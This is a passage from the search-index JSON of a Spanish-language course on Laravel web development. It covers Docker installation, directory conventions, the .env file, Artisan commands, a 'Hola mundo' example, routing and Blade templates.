. Busca una docker image para desarrollo con Laravel en https://hub.docker.com. Por ejemplo, Bitnami (una empresa propiedad de VMWare) tiene imágenes bastante fiables. La imagen de Bitnami para Docker se denomina bitnami/docker. Paso 3 . Crea una carpeta para almacenar el código de tu aplicación web en tu disco duro. No importa en qué parte del árbol de directorios local estés. Paso 4 . En la consola, teclea el comando para crear una copia local de las imágenes necesarias. En el caso de la imagen Laravel de Bitnami, el comando es: . $ docker pull bitnami/laravel . El nombre de la docker image vendrá en la documentación de la propia imagen en https://hub.docker.com . Paso 5 . Sigue las instrucciones para el despliegue del contenedor. El desarrollador de la docker image habrá documentado este proceso en https://hub.docker.com. En el caso de la imagen bitnami/laravel, hay que copiar un archivo remoto mediante el comando curl y levantar las imágenes docker con docker-compose. $ curl -LO https://raw.githubusercontent.com/bitnami/bitnami-docker-laravel/master/docker-compose.yml $ docker-compose up . ¡Y listo! Nuestro Laravel estará funcionando con todas sus dependencias resueltas. ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/instalacion.html#53-instalaci%C3%B3n-de-laravel",
    "relUrl": "/laravel/instalacion.html#53-instalación-de-laravel"
  },"82": {
    "doc": "5.3 Instalación de Laravel",
    "title": "5.3 Instalación de Laravel",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/instalacion.html",
    "relUrl": "/laravel/instalacion.html"
  },"83": {
    "doc": "5.4 Arquitectura, convenciones y configuración de Laravel",
    "title": "5.4. Arquitectura, convenciones y configuración de Laravel",
    "content": ". | 5.4.1. Estructura de directorios | 5.4.2. Convenciones en Laravel | 5.4.3. Variables de entorno. El archivo .env | 5.4.4. Archivos de configuración del directorio /config | . Como cualquier framework, Laravel sigue una serie de convenciones para los identificadores, la estructura de directorios de la aplicación y la configuración. Aunque no es imprescindible seguir esas convenciones, y puede resultar un poco enojoso las primeras veces (en plan: ¿pero por qué tengo que llamar a esa clase así, si quiero llamarla de otro modo?), a la larga el uso de convenciones ahorra muchísimo tiempo de desarrollo y, sobre todo, de depuración. ¿Cuántas veces no has estado depurando un error consistente en haber olvidado que el nombre de una tabla de la base de datos lo habías escrito en plural y no en singular, o al revés? . “Convención sobre configuración” es un lema de muchos frameworks. Quiere decir que, si seguimos las convenciones del framework, tanto si nos gustan como si no, nos ahorraremos mucho tiempo de discusión sobre la configuración y muchos quebraderos de cabeza posteriormente. 5.4.1. Estructura de directorios . Después de una instalación limpia de Laravel, nos encotraremos con una estructura típica de directorios que hay que respetar. Los más importantes (al menos, para empezar) son estos: . composer.json: información para composer (ya sabes, el administrador de paquetes de PHP). Sirve para instalar todas las librerías de terceros que Laravel necesita para funcionar. Imprescindible para instalar la aplicación en otro servidor. /app: el código de nuestra aplicación. Aquí están los modelos. /app/config: configuración de la aplicación. /app/http: peticiones HTTP, incluyendo los controladores. /database: migraciones y seeders de la base de datos. Las migraciones son muy importantes y les dedicaremos un apartado más adelante. /plugins: pues eso. /public: directorio de acceso público. Aquí Laravel generará todo lo que hay que mover al servidor para poner la web en producción. Puedes crear aquí dentro carpetas para colocar imágenes, scripts JS o archivos css. /resources: Aquí dentro están las vistas. También el resto de assets (imágenes, css, js). A diferencia del directorio public, los archivos JS o css que coloquemos aquí estarán precompilados no serán accesibles vía web y, lo que es más importante, podemos crear archivos Less, Sass, JS y varios frameworks JS, y Laravel se encargará de compilarlos automáticamente y generar versiones minimizadas de nuestro CSS y nuestro JS. De momento, vamos a colocar nuestro CSS y nuestro JS en la carpeta /public. Más adelante puedes trastear con /resources si lo deseas. /storage: aquí Laravel guarda su memoria caché, información sobre las sesiones, vistas compiladas… No debes tocar esta carpeta para nada. /vendors: librerías de terceros. Es importante añadir esta carpeta al .gitignore si vas a construir un repositorio git para tu aplicación Laravel, porque /vendors puede ocupar bastante espacio y no tiene sentido incluirla en tu proyecto. Si necesitas desplegar esta aplicación Laravel en otro servidor, basta con clonar el repositorio y ejecutar composer update. Eso rellenará la carpeta /vendor con las librerías más adecuadas para ese servidor. 5.4.2. Convenciones en Laravel . Laravel tiene un montón de convenciones que persiguen hacer más sencilla la configuración de la aplicación y evitar errores tontos que pueden consumir mucho tiempo de depuración. Aunque la mayoría de estas convenciones no son obligatorias, es recomendable respetarlas para ahorrarte quebraderos de cabeza posteriores. | En primer lugar, usa solo identificadores en inglés. Mejor User que Usuario. Así, de paso, practicas un poco el idioma universal de la informática. | Modelos: Los nombres de los modelos deben ser iguales a los de las tablas de la base de datos, pero en singular, en CamelCase y con mayúscula. Ejemplo: RegisteredUser . | Controladores: Llámalos como los modelos, pero añadiendo la palabra “controller”. Ejempo: RegisteredUserController . | Métodos: Se nombran en camelCase yt empezando con minúscula. Ejemplo: RegisteredUser::getAll() . | Atributos: Se nombran en en snake_case y empezando con minúscula. Ejemplo: RegisteredUser::first_name . | Variables: Los identificadores deben ir en camelCase y empezando con minúscula. En plural si se trata de una colección y en singular si es un objeto individual o una variable simple. Ejemplos: bannedUsers (colección, en plural), articleContent (objeto individual, en sigular) . | Tablas: Se nombran en plural y en snake_case. Ejemplo: registered_users. | Columnas de las tablas: Se nombran en snake_case, sin referencia al nombre de la tabla. Ejemplo: first_name . | Clave primaria: La llamaremos id. Siempre. No le des más vueltas. id y punto. El tipo: integer y auto-increment. | Claves ajenas: Se forman con el nombre de la tabla ajena en singular más la palabra id. Ejemplo: article_id . | Timestamps: Laravel siempre crea marcas de tiempo para todo. Y siempre se llaman created_at y updated_at, de tipo datetime. Acostúmbrate a tenerlas en todas tus tablas. | . | Tablas pivote: Son esas tablas horribles formadas como resultado de una relación N:N entre dos tablas maestras. Se nombran en snake_case, en plural y orden alfabético. Ejemplo: articles_users será el pivote entre las tablas articles y users. | . 5.4.3. Variables de entorno. El archivo .env . En el directorio raíz de toda aplicación hecha con Laravel existe un archivo muy especial llamado .env. Ojo, porque en los sistemas tipo Linux, todos los archivos cuyo nombre empieza por un punto están ocultos. Debes buscar la opción para mostrar los archivos ocultos de tu navegador de archivos si quieres verlo. Este archivo contiene todas las variables de entorno que configuran la aplicación, como: . | APP_ENV: En esta variable se indica si la aplicación está en desarrollo o en producción . | APP_DEBUG: ¿Queremos mostrar los errores para depuración? Se pone a true durante el desarrollo y se cambia a false al pasar a producción. | APP_URL: La URL base de la aplicación. Hay que modificarla cuando movemos la aplicación a otro servidor. | DB_CONNECTION, DB_HOST, DB_USERNAME, etc. Es decir, la configuración de la conexión a la base de datos. | . Una instalación limpia de Laravel vendrá con un archivo llamado example.env, que contiene una plantilla para que puedas construir tu propio archivo .env. Simplemente, renombra el archivo example.env y asigna los valores correctos a las variables de entorno. Cuidado: el archivo .env NO debe sincronizarse con git (o con el control de versiones que usemos) porque contiene información sensible. Asegúrate de incluirlo en tu .gitignore. Consulta la sección sobre Git de este mismo manual si no sabes como hacerlo. Una vez creado nuestro archivo .env, podemos usar las variables definidas en él en cualquier otra parte de la aplicación. Por ejemplo, en /config/database.php usaremos una expresión así: . 'default' =&gt; env('DB_CONNECTION', 'mysql') . El primer parámetro de env() es la variable de entorno que queremos consultar y el segundo es el valor por defecto en caso de que la variable no exista. 5.4.4. Archivos de configuración del directorio /config . En este directorio encontraremos multitud de archivos que configuran el funcionamiento de Laravel. En principio, no es necesario modificar ninguno, porque las configuraciones básicas se manejan desde el archivo .env. Sin embargo, hay situaciones en las que sí necesitaremos acceder a estos archivos y tocar alguna configuración. Algunos archivos de configuración importantes que puedes encontrar aquí son: . | database.php: configuración de la conexión a la base de datos. Toma sus valores principales de .env, pero desde aquí podemos cambiar otras cosas, como el controlador (por defecto es MySQL, pero podemos cambiarlo a PostgreSQL, SQLite, etc). | app.php: nombre de la aplicación, estado (desarrollo, producción…). | session.php: forma en la que se almacenarán las variables de sesión (por defecto, en un fichero en el servidor). | . ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/arquitectura-convenciones-configuracion.html#54-arquitectura-convenciones-y-configuraci%C3%B3n-de-laravel",
    "relUrl": "/laravel/arquitectura-convenciones-configuracion.html#54-arquitectura-convenciones-y-configuración-de-laravel"
  },"84": {
    "doc": "5.4 Arquitectura, convenciones y configuración de Laravel",
    "title": "5.4 Arquitectura, convenciones y configuración de Laravel",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/arquitectura-convenciones-configuracion.html",
    "relUrl": "/laravel/arquitectura-convenciones-configuracion.html"
  },"85": {
    "doc": "5.5 Artisan, la consola que mola",
    "title": "5.5. Artisan, la consola que mola",
    "content": ". | 5.5.1. ¿Qué es Artisan y cómo se utiliza? | 5.5.2. Un ejemplo práctico: crear un controlador | 5.5.3. Artisan y máquinas virtuales | 5.5.4. Comandos principales de Artisan | . Laravel viene de serie con una utilidad de consola de comandos llamada Artisan. Con Artisan se automatizan montones de tareas habituales del trabajo con Laravel, así que acostúmbrate a tener siempre abierto un terminal de texto en el directorio raíz de tu aplicación. En esta sección vamos a aprender a utilizar los comandos básicos de Artisan. 5.5.1. ¿Qué es Artisan y cómo se utiliza? . Como hemos dicho, Artisan es una herramienta de consola, escrita en PHP, que viene con Laravel para ayudarte a realizar tareas cotidianas en tu aplicación de forma automatizada. Algunas de esas tareas que automatiza Artisan son: . | Generar esqueletos de controladores y modelos. | Crear migraciones de bases de datos (para manipular la estructura de las tablas, como enseguida veremos). | Rellenar la BD con datos de prueba. | Hacer el enrutamiento. | Configurar la aplicación. | Crear baterías de pruebas. | Gestionar la caché de Laravel (una memoria intermedia generada por Laravel que hace que tu aplicación se cargue más rápido). | . Y así otro montón de cosas. No te preocupes si aún no entiendes qué significan algunas de estas cosas. Lo iremos viendo todo poco a poco. Lo importante ahora es que comprendas la tremenda utilidad de Artisan en el trabajo cotidiano con Laravel y que aprendas lo básico de su sintaxis. 5.5.2. Un ejemplo práctico: crear un controlador . Veamos cómo funciona Artisan con un ejemplo. Supongamos que quieres crear un controlador. Para ello, existen dos maneras: . | A mano. Nos vamos al directorio /app/Http/Controllers y creamos un archivo llamado, digamos, HolaController.php. Luego lo rellenamos con el esqueleto de un controlador vacío, copiando y pegando de otro controlador existente y eliminando todo lo que no nos haga falta. Este método, obviamente, es lento, farragoso y resulta fácil que cometamos algún error. | Con Artisan. Simplemente, tecleamos este comando en el directorio raíz de nuestra aplicación: . $ php artisan make:controller HolaController . ¡Hemos terminado! Artisan creará por nosotros el archivo /app/Http/Controllers/HolaController.php y lo rellenará con el esqueleto de un controlador vacío y sintácticamente correcto. | . 5.5.3. Artisan y máquinas virtuales . Si utilizas Laravel con una máquina virtual (Vagrant/Homestead o Docker), es importante que recuerdes esto: tienes que hacer login en la máquina virtual para poder usar ejecutar los comandos de Artisan. Las primeras veces se te olvidará. Intentarás ejecutar comandos de Artisan en tu máquina real y te dará un error, porque Artisan no está allí instalado, sino en tu servidor (es decir, en tu máquina virtual). | Si usas Vagrant/Homestead, debes loguearte en la máquina virtual así: . $ vagrant ssh . | Si usas Docker, abre una terminal en tu máquina virtual con este comando: . $ docker exec -it &lt;id-del-contenedor&gt; bash . (Si desconoces el id de tu contenedor, puedes averiguarlo con el comando $ docker container ls) . | . Una vez dentro de la máquina virtual, accede al directorio de tu aplicación y podrás ejecutar cualquier comando de Artisan. 5.5.4. Comandos principales de Artisan . Una buena forma de empezar con Artisan es teclear este comando: . $ php artisan list . Ya te imaginas lo que hace, ¿verdad? . Por si acaso andas un poco despistado/a hoy, te lo cuento yo: Artisan te mostrará una lista con todos los comandos válidos en tu instalación de Laravel. Esto puede variar según tu versión de Laravel y los componentes que tengas instalados. En un primer momento, estos son los comandos que más vas a utilizar (cuando te conviertas en un experto/a en Laravel, irán llegando otros por pura necesidad): . | php artisan db:migrate –&gt; Para hacer migraciones (crear la estructura de nuestra base de datos). | php artisan db:seed –&gt; Para llenar de datos predefinidos nuestra base de datos. | php artisan make:migration –&gt; Crea una migración (para crear la estructura de la base de datos). | php artisan make:seeder –&gt; Crea un seeder (para rellenar con datos las tablas). | php artisan make:controller –&gt; Para crear un controlador. | php artisan make:model –&gt; Para crear un modelo. | php artisan route:list –&gt; Muestra todas las rutas definidas en el enrutador. | . ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/artisan.html#55-artisan-la-consola-que-mola",
    "relUrl": "/laravel/artisan.html#55-artisan-la-consola-que-mola"
  },"86": {
    "doc": "5.5 Artisan, la consola que mola",
    "title": "5.5 Artisan, la consola que mola",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/artisan.html",
    "relUrl": "/laravel/artisan.html"
  },"87": {
    "doc": "5.6 Primeros pasos con Laravel. Hola mundo",
    "title": "5.6. Primeros pasos con Laravel: Hola mundo",
    "content": ". | Paso 1. Crea una clave segura | Paso 2. Prueba el enrutador | Paso 3. Crea una ruta hacia un controlador | Paso 4. Cargar una vista desde el controlador | . En esta sección vamos a crear nuestra primera aplicación funcional con Laravel: el tradicional “Hola mundo”. Vale, ya sé que no es gran cosa, pero nos servirá para aprender la dinámica de trabajo con Laravel y para construir un esqueleto de aplicación sobre la que montar algo más grande más adelante. Vamos a crear esta aplicación paso a paso. Tal vez te parezca un poco exagerado, pero recuerda que la curva de aprendizaje de Laravel es muy empinada al principio y se suaviza mucho después. Es decir: los primeros pasos son los que más cuestan. Paso 1. Crea una clave segura . Lo primero que debes hacer en cualquier aplicación Laravel es crear una clave segura para la aplicación. Esto crea una clave de encriptación aleatoria que se guarda en el archivo de configuración de la aplicación (.env). Laravel utilizará esa clave para cifrar ciertas cosas (por ejemplo, las contraseñas de usuario). Por ahora, no te preocupes de para qué sirve exactamente esta clave. Lo único importante es que Laravel no funcionará sin ella. Así pues, lo primero que hay que hacer con cualquier aplicación Laravel nueva es ejecutar este comando: . php artisan key:generate . Paso 2. Prueba el enrutador . Vamos a empezar probando algo sencillo: capturar una ruta. Edita el archivo /routes/web.php y añade esto: . Route::get('/hola', function() { return \"Hola, mundo\"; }); . Esto significa que, cuando escribas la ruta “hola” en la barra de direcciones del navegador, se ejecutará esta función anónima (también denominadas closure) y, como resultado, se verá el texto “Hola, mundo” en la ventana del navegador. Pruébalo en el navegador, escribiendo la dirección: http://mi-servidor/index.php/hola . Paso 3. Crea una ruta hacia un controlador . Los closures o funciones sin nombre raramente se usan en el enrutador. Lo que suele hacer en enrutador es redirigir la ejecución hacia un controlador. Es justo lo que vamos ahora. Edita el enrutador (/routes/web.php) y sustituye la ruta anterior por esto: . Route::get('/hola', 'HolaController@index'); . Esto indica al enrutador que, al recibir la ruta “hola”, se debe ejecutar el método index() del controlador HolaController. Pero el controlador HolaController no existe, así que vamos a crearlo con este comando de Artisan:: . $ php artisan make:controller HolaController . Por último, edita el controlador (/app/Http/Controllers/HolaController.php) y añádele el método index(): . public function index() { return \"Hola, mundo\"; } . Comprueba que funciona en el navegador: http://mi-servidor/index.php/hola . NOTA IMPORTANTE: a partir de Laravel 8, para que este enrutamiento funcione es necesario descomentar la siguiente línea del archivo /app/Providers/RouteServiceProvider.php: . // protected $namespace = 'App\\Http\\Controllers'; ) . Paso 4. Cargar una vista desde el controlador . ¿Recuerdas que, en la arquitectura MVC, el controlador no debería producir ninguna salida HTML? . Pues bien, nuestro controlador la está produciendo. Vamos a modificarlo para que el método index() del controlador no genere el “Hola, mundo”, sino que invoque a una vista que se encargue de ello. Además, vamos a inyectar en la URL una variable con el nombre del usuario para mostrar cómo se capturan esos valores y cómo se pasan a las vistas en Laravel. Comenzamos modificando el enrutador (/routes/web.php). Observa cómo se usan las llaves { y } para indicar la presencia de una variable en la URL: . Route::get('/hola/{nombre}', 'HolaController@show'); . Ahora creamos un método show() en el controlador (/app/Http/Controllers/HolaController.php): . public function show($nombre) { $data['nombre'] = $nombre; return view('hola', $data); } . Como ves, estamos invocando una vista llamada hola y le estamos pasando un array con los datos necesarios (el nombre del usuario, en este caso). Esa vista debe crearse en /resources/views/hola.blade.php y puede tener este aspecto: . &lt;body&gt; Saludos, {{$nombre}}. ¿Le apetece una partidita de ajedrez? &lt;/body&gt; . Puedes probar esta nueva ruta cargando en el navegador una ruta como: http://mi-servidor/index.php/hola/ProfesorFalken . La respuesta debería ser esta: . Saludos, ProfesorFalken. ¿Le apetece una partidita de ajedrez? . Recuerda que, desde Laravel 8, el funcionamiento del enrutador ha cambiado. Para conservar compatibilidad hacia atrás, hay que abrir el archivo /app/Providers/RouteServiceProvider.php y descomentar esta línea: . // protected $namespace = 'App\\Http\\Controllers'; . Hay otras soluciones para esto que se describen aquí. ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/hola-mundo-con-laravel.html#56-primeros-pasos-con-laravel-hola-mundo",
    "relUrl": "/laravel/hola-mundo-con-laravel.html#56-primeros-pasos-con-laravel-hola-mundo"
  },"88": {
    "doc": "5.6 Primeros pasos con Laravel. Hola mundo",
    "title": "5.6 Primeros pasos con Laravel. Hola mundo",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/hola-mundo-con-laravel.html",
    "relUrl": "/laravel/hola-mundo-con-laravel.html"
  },"89": {
    "doc": "5.7 Enrutamiento",
    "title": "5.7. Enrutamiento",
    "content": ". | 5.7.1. ¿Qué es el enrutador? | 5.7.2. Enrutamiento básico | 5.7.3. Rutas con nombre | 5.7.4. Verbos http: GET, POST, PUT, PATCH y DELETE | 5.7.5. Orden de las rutas | 5.7.6. Servidor RESTful | . Llegados a este punto, ya debes haber creado tu primera aplicación Laravel (“Hola, mundo”) y habrás aprendido algo fundamental sobre el enrutador: cómo hacer que la solicitud de una URL termine ejecutando un método de un controlador. En esta sección, profundizaremos en el enrutador, un componente fundamental de cualquier aplicación web. 5.7.1. ¿Qué es el enrutador? . El enrutador de Laravel es el componente que captura las URL solicitadas al servidor y las traduce a invocaciones a métodos de los controladores. El enrutador es capaz, además, de mapear fragmentos de la URL a variables PHP que serán inyectadas como parámetros a los métodos del controlador. Esto significa que, si le pides al servidor una ruta como esta: . https://mi-servidor/user/delete/12 . …el enrutador puede “trocear” esa URL para extraer los segmentos (“user”, “delete” y “12”). Y tú puedes decidir qué hacer con cada uno de esos segmentos. Lo normal en este ejemplo sería que invocaras el método delete() del controlador UserController, y que ese método recibiera como parámetro el dato 12, que será el id del usuario que se pretende borrar. Y hay una última cosa que el enrutador puede hacer: distinguir el verbo http empleado para solicitar una página al servidor. Es decir, para el enrutador no es lo mismo una solicitud enviada por GET que otra enviada por POST. Incluso admite verbos que aún no están soportados por HTML, como DELETE o PUT, y que teóricamente van a formar parte de futuras implementaciones del lenguaje. Un poco más abajo explicaremos qué narices significa todo esto. 5.7.2. Enrutamiento básico . Como vimos en el ejemplo del “Hola, mundo”, hay varias formas de generar una salida HTML desde el enrutador (/routes/web.php). En este código de ejemplo vemos las cuatro formas básicas: . // Forma 1: generar la salida directamente en el enrutador, con un closure (función sin nombre) Route::get('/hola', function() { return \"Hola, mundo\"; }); // Forma 2: llamar a una función de un controlador sin pasarle parámetros Route::get('/hola', 'HolaController@show'); // Forma 3: llamar a una función de un controlador pasándole parámetros Route::get('/hola/{nombre}', 'HolaController@show'); // Forma 4: llamar a una función de un controlador con un parámetro optativo Route::get('/hola/{nombre?}', 'HolaController@show'); . La diferencia esntre la forma 3 y la 4 es que, en la forma 3, la ruta debe llevar forzosamente un dato a continuación de “/hola” (algo como: https://mi-servidor/hola/juan). Si no lo lleva, el enrutador considerará que no se trata de esa ruta y seguirá buscando alguna ruta coincidente en el resto del archivo. En cambio, en la forma 4, el dato final es optativo, así que el enrutador invocará el método show() del controlador tanto si ese dato aparece en la URL como si no lo hace. 5.7.3. Rutas con nombre . Es MUY recomendable asignar un nombre a las rutas en el enrutador. Esto hace que, más adelante, podamos cambiar la URL de los enlaces sin tener que modificar el código fuente de nuestras vistas. El nombre se le asigna a una ruta añadiendo -&gt;name('nombre') al final: . Route::get('/contactame', 'Controlador@contacto')-&gt;name('contact'); . En tu código fuente, debes referirte a esta ruta siempre con la expresión route('contact') (ya veremos exactamente cómo se hace esto), pero el usuario verá la dirección https://servidor/contactame. En el futuro se puede cambiar la forma en la que lo ve el usuario. Por ejemplo, puedes cambiar Route::get('/contactame'...) por Route::get('/acerca-de'...), pero no tendrás que modificar ni una línea de código más en tu aplicación, porque internamente esa ruta seguirá llamándose route('contact'). 5.7.4. Verbos http: GET, POST, PUT, PATCH y DELETE . Además de GET, en el enrutador se pueden enrutar otras acciones: . Route::get(); // Solicitudes habituales Route::post(); // Recepción de datos de formulario (para insert) Route::put(); // Recepción de datos para update (también puede escribirse Route::patch(), que no es lo mismo, pero casi) Route::delete(); // Recepción de datos para delete Route::match(array('GET','POST'), 'ruta', acción) // Responderá tanto a GET como a POST . Los verbos PUT, PATCH y DELETE no están soportados aún por HTML. Las razones por las que esto ocurre son tan confusas que, sinceramente, creo que ni siquiera en el W3C lo entienden. La cuestión es que aún no existen, y punto. Es decir, no puedes crear un formulario así: &lt;form method='PUT'&gt;, porque tu navegador no lo entenderá. Solo puedes poner &lt;form method='GET'&gt; o &lt;form method='POST'&gt;. Cuando trabajes con Laravel, puedes emular PUT, PATCH o DELETE en los formularios así: . &lt;form action=\"/foo/bar\" method=\"POST\"&gt; @method('DELETE') . Tal vez, llegado a este punto, te estés preguntando qué diferencia hay entre PUT y PATCH. O tal vez no. Salta a la siguiente sección si no te interesan estas sutilezas, y continúa leyendo en caso contrario. En teoría, una petición enviada por PUT debería culminar con la ejecución de un UPDATE en el servidor que modifique un recurso entero. Es decir, un registro completo de una tabla de la base de datos. En cambio, PATCH debería emplearse cuando el UPDATE vaya a modificar solo una parte de los campos de un registro, y no todos. ¿Que te parece una chorrada hacer esa distinción? Bueno, lo que tú o yo opinemos no importa demasiado. Todo esto es un estándar y, por lo tanto, hay que comérselo con patatas. 5.7.5. Orden de las rutas . El orden en el que se escriben las rutas en el enrutador es importante. Por ejemplo, si pedimos la dirección http://mi-servidor/usuario/crear, escribir estas dos rutas en este orden es un error: . Route::get('usuario/{nombre}', 'UsuarioController@show'); Route::get('usuario/crear', 'UsuarioController@create'); . El enrutador tratará de mostrar un usuario cuyo nombre sea “crear” (que seguramente no existirá) porque la petición encaja con las dos rutas y el enrutador elegirá la primera ruta que encuentre. La solución pasa por alterar el orden de las líneas en el enrutador: . Route::get('usuario/crear', 'UsuarioController@create'); Route::get('usuario/{nombre}', 'UsuarioController@show'); . De este modo, la petición http://mi-servidor/usuario/crear seguirá encajando en las dos rutas, pero el enrutador elegirá la primera. En cambio, una petición parecida pero con cualquier otro nombre (por ejemplo, http://mi-servidor/usuario/luis), solo encajará con la segunda ruta. 5.7.6. Servidor RESTful . Un servidor RESTful es aquel que responde a la arquitectura REST. La arquitectura REST no es más que una forma estandarizada de construir un servidor para que realice las tareas típicas de mantenimiento de recursos. Y los recursos pueden ser cualquier cosa que se almacene en el servidor: usuarios, clientes, productos, películas, facturas… . Es decir: el 99% de las veces, los recursos son registros en una tabla de la base de datos. El enrutador de un servidor RESTful contendrá las 7 operaciones definidas en la arquitectura REST para cada recurso accesible desde la red, y que permiten manipular el recurso: mostrarlo, buscarlo, insertarlo, modificarlo o borrarlo. Por ejemplo, para un recurso llamado “user”, esas 7 operaciones son: . Route::get('user', 'UserController@index')-&gt;name('user.index'); // Recupera todos los usuarios Route::get('user/{user}', 'UserController@show')-&gt;name('user.show'); // Recupera un usuario concreto con id = user Route::get('user/crear', 'UserController@create')-&gt;name('user.create'); // Lanza el formulario de creación de usuarios Route::post('user/{user}', 'UserController@store')-&gt;name('user.store'); // Recoge los datos del formulario y los inserta en la base de datos Route::get('user/{user}/edit', 'UserController@edit')-&gt;name('user.edit'); // Lanza el formulario de modificación de usuarios Route::patch('user/{user}', 'UserController@update')-&gt;name('user.update'); // Recoge los datos del formulario y modifica el usuario de la base de datos Route::delete('user/{user}', 'UserController@destroy')-&gt;name('user.destroy'); // Elimina al usuario de la base de datos . Ten encuenta que, si estás construyendo un servidor RESTful, debes respetar escrupulosamente los nombres y URLs de las rutas. Así, cualquier otro usuario o aplicación que use tu servidor sabrá cómo manipular los recursos sin necesidad de consultar la documentación técnica. Laravel te permite resumir esas entradas del enrutador en una sola línea que engloba a las siete rutas REST: . Route::resource('user'); . ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/enrutamiento.html#57-enrutamiento",
    "relUrl": "/laravel/enrutamiento.html#57-enrutamiento"
  },"90": {
    "doc": "5.7 Enrutamiento",
    "title": "5.7 Enrutamiento",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/enrutamiento.html",
    "relUrl": "/laravel/enrutamiento.html"
  },"91": {
    "doc": "5.8 Vistas y plantillas. Blade",
    "title": "5.8. Vistas y plantillas. Blade",
    "content": ". | 5.8.1. Master layout | 5.8.2. Vistas que heredan del master layout | 5.8.3. Cómo pasar variables a las vistas | 5.8.4. Cómo usar las variables en las vistas | 5.8.5. Condiciones en las vistas | 5.8.6. Bucles en las vistas | 5.8.7. Invocación de funciones PHP | 5.8.8. Otras directivas Blade | 5.8.9. Tratamiento de formularios con Blade | 5.8.10. Validación de formularios con Blade | 5.8.11. Añadir CSS y Javascript a nuestras vistas | 5.8.12. Vistas de error personalizadas | . Blade es un poderoso y sencillo sub-lenguaje que nos permitirá generar plantillas de vistas para minimizar el código que necesitaremos para nuestras vistas. Las plantillas Blade admiten condiciones y bucles para operar con las variables PHP, de modo que la misma plantilla se comporta de forma diferente con diferentes conjuntos de datos. ¡Y se acabó la pesadilla de abrir y cerrar comillas en las instrucciones echo! . Con Blade, tampoco será necesario abrir y cerrar php (&lt;?php ... ?&gt;) para operar con las variables del servidor y generar la salida. El código escrito con Blade no solo es más limpio y fácil de depurar que con PHP básico, sino también más seguro, porque Blade impide cualquier ataque con XSS. Pero es no es todo. Además, unas plantillas pueden heredar de otras para reutilizar mejor el código. Así que Blade tiene un montón de ventajas y ningún inconveniente. Bueno, sí que tiene un inconveniente: que tienes que aprender a usarlo. Pero es tan sencillo que, cuando hayas trabajado con Blade un par de semanas, te preguntarás cómo habías podido sobrevivir hasta ahora sin él. 5.8.1. Master layout . Layout es una forma genérica de referirse al diseño de capas del interfaz de usuario de una aplicación. Es decir, el layout de una aplicación es el diseño de los elementos de su interfaz de usuario. (Ejemplos de layout adaptados a diferentes tamaños de pantalla. Imagen tomada de Seobility.net y publicada con licencia CC BY-SA 4.0) . El master layout es el diseño maestro del que derivan todas las vistas. Las aplicaciones web suelen tener un master layout muy definido, y todas las vistas de la aplicación lo respetan. Ese master layout suele almacenarse, por convenio, en un archivo llamado /resources/views/layouts/master.blade.php . Vamos a construir un master layout de ejemplo. Será muy simple, pero más adelante puedes complicarlo todo lo que quieras, y cada modificación afectará automáticamente a todas las vistas de tu aplicación. &lt;html&gt; &lt;head&gt; &lt;title&gt;@yield('Titulo')&lt;/title&gt; &lt;/head&gt; &lt;body&gt; @section('sidebar') Este es mi master sidebar. @show &lt;div class=\"container\"&gt; @yield('content') &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; . Aquí nos encontramos con varias directivas importantes de Blade: . | @yield(‘Titulo’) –&gt; Esto define una sección llamada ‘Título’, que en el master layout está vacía. Las vistas que hereden del master layout tendrán que definir cuál es el valor de ‘Título’, y ese valor aparecerá escrito aquí. | @section(‘sidebar’) –&gt; Esto define una sección llamada ‘sidebar’ que NO está vacía (contiene el texto “Este es mi master sidebar”, pero podría contener cualquier otra cosa). Las vistas que hereden del master layout podrán AÑADIR contenido a esta sección. | @show –&gt; Hace que el contenido de la sección se muestre en ese punto del documento. | @yield(‘content’) –&gt; De nuevo, una sección que está vacía en el master layout y cuyo contenido tendrá que definirse en las vistas que hereden de esta. | . 5.8.2. Vistas que heredan del master layout . Después de crear nuestro master layout, lo siguiente es empezar a construir vistas que lo utilicen. Es decir, que hereden de él todos sus componentes y añadan nuevos elementos, respetando la configuración básica establecida por el master layout. El aspecto de una vista que herede del master layout de nuestro ejemplo anterior debería ser este: . @extends('master') @section('title', 'Titulo de la página') @section('sidebar') &lt;p&gt;Esto se añadirá al master sidebar.&lt;/p&gt; @endsection @section('content') &lt;p&gt;Aquí va el contenido de mi página.&lt;/p&gt; @endsection . De nuevo tenemos varias directivas de Blade muy importantes: . | @extends(‘master’) –&gt; Esto indica que esta vista hereda del master layout. | @section(‘title, ‘Título de la página’) –&gt; Aquí se define el contenido de la sección ‘Título’ que en el master layout estaba vacía. | @section(‘sidebar’) –&gt; Aquí añade contenido a la sección ‘sidebar’, que en el master layout no estaba vacía. | @ensection –&gt; Se emplea cuando el contenido de una sección ocupa varias líneas de código y no es posible escribirlo dentro de la propia directiva. | . 5.8.3. Cómo pasar variables a las vistas . Las variables a las vistas deben enviarse empaquetadas en un array. Hay varias formas de lograr esto, todas ellas correctas. Puedes emplear la que te resulte más cómoda o más elegante: . // Forma 1: crear el array antes de llamar a la vista $data['variable1'] = 'valor'; $data['variable2'] = 'valor'; return view('vista', $data); // Forma 2: crear un array con el constructor array() return view('vista', array('variable1'=&gt;'valor', 'variable2'=&gt;'valor')); // Forma 3: crear un array con corchetes [] return view('vista', ['variable1'=&gt;'valor', 'variable2'=&gt;'valor']); // Forma 4: usar el método with() return view('vista')-&gt;with(['variable1'=&gt;'valor', 'variable2'=&gt;'valor']); // Forma 5: usar la función compact() return view('vista', compact('variable1', 'variable2')); . 5.8.4. Cómo usar las variables en las vistas . Vale, ya hemos enviado algunas variables a las vistas. Ahora, ¿cómo las usamos? . La vista no recibe el array con las variables, sino las variables ya extraídas del array. Esto significa que, si le pasas a una vista un par de variables como ['variable1'=&gt;'valor', 'variable2'=&gt;'valor'], en la vista existirán dos variables llamadas $variable1 y $variable2, y no encontrarás ni rastro del array que las contenía. Veámoslo con un ejemplo. Supongamos que tenemos este método en un controlador: . function show() { return view('page', array('name' =&gt; 'Manolo Escobar')); } . En la vista /resources/views/page.blade.php tendrás disponible una variable $name, y la puedes 